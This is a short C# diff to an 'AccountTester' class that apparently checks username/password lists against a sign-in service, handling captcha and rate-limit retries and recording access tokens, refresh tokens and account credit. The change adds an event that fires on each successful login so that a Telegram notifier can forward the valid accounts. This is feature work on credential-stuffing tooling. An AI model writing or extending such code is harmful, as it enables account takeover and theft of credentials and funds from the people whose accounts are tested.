@@ -24,6 +24,10 @@ public static class AccountTester
     /// The UI uses it to count the RETRY category (these accounts are not persisted, so they stay retryable).</summary>
     public static event Action? RetryAbandoned;
 
+    /// <summary>Raised once for every freshly-tested account that came back successful (HTTP 200), carrying the
+    /// full outcome. Subscribers (e.g. the Telegram notifier) filter by category/credit.</summary>
+    public static event Action<CredentialEntry>? AccountFound;
+
     /// <summary>Wires a logger so the checker emits live per-account traces (captcha request, sign-in,
     /// 429 retries, result). Set once at startup; logging is a no-op until then.</summary>
     public static void SetLogger(ILogger logger) => _log = logger;
@@ -133,7 +137,9 @@ public static class AccountTester
                         success, signin.StatusCode, signin.AccessToken, signin.RefreshToken,
                         credit, birth, signin.Raw, DateTime.UtcNow, state);
                     registry.Complete(cred.Username, cred.Password, result);
-                    return Apply(cred, result);
+                    var applied = Apply(cred, result);
+                    if (success) AccountFound?.Invoke(applied); // notifier filters by category/credit
+                    return applied;
                 }
 
                 // Non-definitive (429 / 5xx / 0 / …) → retry up to the cap, else give up (retryable later).
